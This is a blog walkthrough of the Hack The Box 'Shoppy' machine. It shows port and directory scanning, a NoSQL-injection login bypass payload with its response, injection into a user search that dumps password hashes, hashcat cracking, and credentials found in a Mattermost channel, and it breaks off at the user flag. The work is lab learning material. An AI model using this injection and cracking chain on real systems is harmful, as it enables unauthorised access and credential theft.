@@ -1,0 +1,354 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Shoppy HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Shoppy HTB Walkthrough"><meta property="og:description" content="Intro I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review & learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again.
+So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-01-14-shoppy-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-14T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-15T11:25:27+11:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Shoppy HTB Walkthrough"><meta name=twitter:description content="Intro I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review & learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again.
+So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-01-14-shoppy-htb/><link rel=prev href=https://emdwyer.github.io/2021-03-28-learning-update/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Shoppy HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-01-14-shoppy-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"pentesting, infosec, penetration testing, security, docker, reversing","wordcount":2009,"url":"https:\/\/emdwyer.github.io\/2023-01-14-shoppy-htb\/","datePublished":"2023-01-14T00:00:00+00:00","dateModified":"2023-01-15T11:25:27+11:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Shoppy HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-01-14>2023-01-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;2009 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;10 minutes&nbsp;<span id=/2023-01-14-shoppy-htb/ class=leancloud_visitors data-flag-title="Shoppy HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./shoppy.png data-srcset="./shoppy.png, ./shoppy.png 1.5x, ./shoppy.png 2x" data-sizes=auto alt=./shoppy.png title=Shoppy></p><h2 id=intro>Intro</h2><p>I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review & learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again.</p><p>So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired.</p><h2 id=enumeration>Enumeration</h2><p>As always, we connect to the HTB VPN using OpenVPN, and join the machine to be given an IP address. All work is done from a Parrot OS VirtualBox VM.</p><p>Firstly, a quick nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.180
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-12-25 15:38 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.180
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.020s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.23.1
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://shoppy.htb
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.23.1
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect res
+</span></span></code></pre></td></tr></table></div></div><p>Browsing to http://10.10.11.180 redirects to <a href=http://shoppy.htb target=_blank rel="noopener noreffer">http://shoppy.htb</a>, so I added this to my /etc/hosts file.</p><p>Browsing to <a href=http://shoppy.htb target=_blank rel="noopener noreffer">http://shoppy.htb</a> gives a landing page with a countdown:
+<img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-25-15-50-18-image.png data-srcset="./2022-12-25-15-50-18-image.png, ./2022-12-25-15-50-18-image.png 1.5x, ./2022-12-25-15-50-18-image.png 2x" data-sizes=auto alt=./2022-12-25-15-50-18-image.png title=./2022-12-25-15-50-18-image.png></p><p>Gobuster output using common.txt wordlist:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -u <span class=s2>&#34;http://shoppy.htb&#34;</span> -w /usr/share/dirb/wordlists/common.txt 
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.1.0
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://shoppy.htb
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2022/12/25 15:53:38 Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 28<span class=o>]</span> <span class=o>[</span>--&gt; /login<span class=o>]</span>
+</span></span><span class=line><span class=cl>/Admin                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 28<span class=o>]</span> <span class=o>[</span>--&gt; /login<span class=o>]</span>
+</span></span><span class=line><span class=cl>/ADMIN                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 28<span class=o>]</span> <span class=o>[</span>--&gt; /login<span class=o>]</span>
+</span></span><span class=line><span class=cl>/assets               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 179<span class=o>]</span> <span class=o>[</span>--&gt; /./<span class=o>]</span>
+</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span> <span class=o>[</span>--&gt; /css/<span class=o>]</span>   
+</span></span><span class=line><span class=cl>/exports              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 181<span class=o>]</span> <span class=o>[</span>--&gt; /exports/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 213054<span class=o>]</span>             
+</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 177<span class=o>]</span> <span class=o>[</span>--&gt; /fonts/<span class=o>]</span>  
+</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 179<span class=o>]</span> <span class=o>[</span>--&gt; /images/<span class=o>]</span> 
+</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 171<span class=o>]</span> <span class=o>[</span>--&gt; /js/<span class=o>]</span>     
+</span></span><span class=line><span class=cl>/login                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1074<span class=o>]</span>               
+</span></span><span class=line><span class=cl>/Login                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1074<span class=o>]</span>               
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2022/12/25 15:53:49 <span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><p>I attempted to run sqlmap against <a href=http://shoppy.htb/login target=_blank rel="noopener noreffer">http://shoppy.htb/login</a>, but kept getting timeout errors:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[17:43:29] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+</span></span><span class=line><span class=cl>[17:44:59] [CRITICAL] connection timed out to the target URL or proxy
+</span></span></code></pre></td></tr></table></div></div><p>I next ran sqlmap through burp suite and checked the intercepted traffic:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sqlmap</span> -u <span class=s2>&#34;http://shoppy.htb/login&#34;</span> --data <span class=s2>&#34;username=*&amp;password=*&#34;</span> --proxy <span class=s2>&#34;http://127.0.0.1:8080&#34;</span> --headers<span class=o>=</span><span class=s2>&#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-25-17-47-52-image.png data-srcset="./2022-12-25-17-47-52-image.png, ./2022-12-25-17-47-52-image.png 1.5x, ./2022-12-25-17-47-52-image.png 2x" data-sizes=auto alt=./2022-12-25-17-47-52-image.png title=./2022-12-25-17-47-52-image.png></p><p>At this point, it appeared to my novice eyes as though a WAF (web app firewall) was blocking SQL injection attempts (maybe?) as &rsquo;normal&rsquo; login attempts result in a 302 redirect, not a 504 gateway timeout.</p><p>I did notice the timeouts only occur when injecting into user, not password &ndash; so I suspected that this was the exploitable input field..</p><p>But the above was a modified intercepted request from Firefox with a legitimate user agent string along with other headers &ndash; so perhaps not a WAF and something else?..</p><p>After a little while of unsuccessful SQL Injection both with SQLMap and manuall, I back tracked a little to look at other injection techniques and started reading <a href=https://book.hacktricks.xyz/pentesting-web/nosql-injection target=_blank rel="noopener noreffer">NoSQL injection - HackTricks</a></p><p>I then tried the following to see if I was dealing with some document database that could be injected into:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /login HTTP/1.1
+</span></span><span class=line><span class=cl>Content-Length: 42
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Host: shoppy.htb
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded; charset=utf-8
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>username=admin&#39; || 1==1%00&amp;password=foobar
+</span></span></code></pre></td></tr></table></div></div><p>The initial example of <code>username=admin' || 1==1//&password=foobar</code> gave a 504, but the above worked and gave the following response!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 302 Found
+</span></span><span class=line><span class=cl>Server: nginx/1.23.1
+</span></span><span class=line><span class=cl>Date: Sun, 25 Dec 2022 07:38:44 GMT
+</span></span><span class=line><span class=cl>Content-Type: text/plain; charset=utf-8
+</span></span><span class=line><span class=cl>Content-Length: 28
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Location: /admin
+</span></span><span class=line><span class=cl>Vary: Accept
+</span></span><span class=line><span class=cl>Set-Cookie: connect.sid=s%3Aw1vzR-3zSPV98eF-hiBqdfT8SFB4-Omf.s03gQG0EK%2F4m8xUI8cB0EP5xTTqOk7SEFv9W16yAxJY; Path=/; HttpOnly
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Found. Redirecting to /admin
+</span></span></code></pre></td></tr></table></div></div><p>After the redirect I ended up at /admin:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-25-19-06-29-image.png data-srcset="./2022-12-25-19-06-29-image.png, ./2022-12-25-19-06-29-image.png 1.5x, ./2022-12-25-19-06-29-image.png 2x" data-sizes=auto alt=./2022-12-25-19-06-29-image.png title=./2022-12-25-19-06-29-image.png></p><p>The page looks fairly static, apart from the <em>Search for users</em> button which does a GET <a href=http://shoppy.htb/admin/search-users target=_blank rel="noopener noreffer">http://shoppy.htb/admin/search-users</a> .</p><p>If i inject into this with <code>' || 1==1//</code> , I get to users in the download link that shows - <a href=http://shoppy.htb/exports/export-search.json target=_blank rel="noopener noreffer">http://shoppy.htb/exports/export-search.json</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>[</span>
+</span></span><span class=line><span class=cl><span class=err>    </span><span class=p>{</span><span class=nt>&#34;_id&#34;</span><span class=p>:</span><span class=s2>&#34;62db0e93d6d6a999a66ee67a&#34;</span><span class=p>,</span><span class=nt>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;23c6877d9e2b564ef8b32c3a23de27b2&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl><span class=err>    </span><span class=p>{</span><span class=nt>&#34;_id&#34;</span><span class=p>:</span><span class=s2>&#34;62db0e93d6d6a999a66ee67b&#34;</span><span class=p>,</span><span class=nt>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;josh&#34;</span><span class=p>,</span><span class=nt>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;6ebcea65320589ca4f2f1ce039975995&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>After running hashcat against a file containing both MD5 sums:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$hashcat</span> -a <span class=m>0</span> hashes.txt /usr/share/wordlists/rockyou.txt 
+</span></span><span class=line><span class=cl>hashcat <span class=o>(</span>v6.1.1<span class=o>)</span> starting...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$hashcat</span> --show hashes.txt 
+</span></span><span class=line><span class=cl>6ebcea65320589ca4f2f1ce039975995:remembermethisway
+</span></span></code></pre></td></tr></table></div></div><p>I was unable to SSH into the machine with josh/remembermethisway, and here I got a little stuck.. I reviewed the server, looking for other clues but couldn&rsquo;t find much.</p><p>I decided to scan all ports with <code>nmap -sC -sV -oN nmap/all -p- 10.10.11.180</code>, and saw 9093 was an open HTTP server</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-26-09-08-57-image.png data-srcset="./2022-12-26-09-08-57-image.png, ./2022-12-26-09-08-57-image.png 1.5x, ./2022-12-26-09-08-57-image.png 2x" data-sizes=auto alt=./2022-12-26-09-08-57-image.png title=./2022-12-26-09-08-57-image.png></p><p>Searching around, it looked like Prometheus go metrics &ndash; however there was nothing that appeared particularly useful.</p><p>I&rsquo;ll admit that here I &lsquo;cheated&rsquo; and checked the HTB discussion thread for this box &ndash; and saw people hinting at another subdomain.</p><p>I noticed when searching for some of the terms in the above prometheus alerts, particularly around playbooks, I saw reference to mattermost: <a href=https://github.com/mattermost/mattermost-plugin-playbooks target=_blank rel="noopener noreffer">GitHub - mattermost/mattermost-plugin-playbooks: Mattermost Playbooks enable reliable and repeatable processes for your teams using checklists, automation, and retrospectives.</a></p><p>With this in mind, I ran a vhost scan in gobuster using SecList DNS lists..</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> vhost -u <span class=s2>&#34;http://shoppy.htb&#34;</span> -w ~/SecLists/Discovery/DNS/*.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.1.0
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:          http://shoppy.htb
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:       GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:      <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:     /home/zara/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:   gobuster/3.1.0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:      <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2022/12/26 08:58:33 Starting gobuster in VHOST enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Found: mattermost.shoppy.htb <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 3122<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Luckily the first wordlist found the subdomain, and I ended the scan and added mattermost.shoppy.htb to my /etc/hosts. Now I&rsquo;m able to use josh/remembermethisway credentials to log in to <a href=http://mattermost.shoppy.htb/ target=_blank rel="noopener noreffer">http://mattermost.shoppy.htb/</a>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-26-12-24-33-image.png data-srcset="./2022-12-26-12-24-33-image.png, ./2022-12-26-12-24-33-image.png 1.5x, ./2022-12-26-12-24-33-image.png 2x" data-sizes=auto alt=./2022-12-26-12-24-33-image.png title=./2022-12-26-12-24-33-image.png></p><p>After a little poking around, in the Deploy Machine channel we find credentials jaeger/Sh0ppyBest@pp!:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-26-12-27-43-image.png data-srcset="./2022-12-26-12-27-43-image.png, ./2022-12-26-12-27-43-image.png 1.5x, ./2022-12-26-12-27-43-image.png 2x" data-sizes=auto alt=./2022-12-26-12-27-43-image.png title=./2022-12-26-12-27-43-image.png></p><p>Immediately jumping to SSH, we now have a user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
